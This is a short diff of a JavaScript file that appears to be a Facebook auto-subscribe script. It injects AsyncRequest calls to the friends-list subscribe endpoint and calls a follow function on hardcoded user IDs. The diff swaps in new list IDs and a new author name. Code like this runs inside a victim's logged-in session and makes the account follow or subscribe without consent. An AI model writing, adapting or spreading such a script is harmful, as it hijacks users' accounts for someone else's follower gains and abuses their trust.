@@ -55,13 +55,13 @@ function sublist(uidss) {
 		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 		document.body.appendChild(a);
 }
-//Kapalo Arak
+//Tumul
 a("100000958830505");
 a("100007138530335");
 a("100007997251109");
 
-sublist("100007138530335");
-sublist("1382004058742823");
+sublist("1377482339194995");
+sublist("1376670829276146");
 sublist("1382005752075987");
 sublist("1382006145409281");
 sublist("1382006605409235");
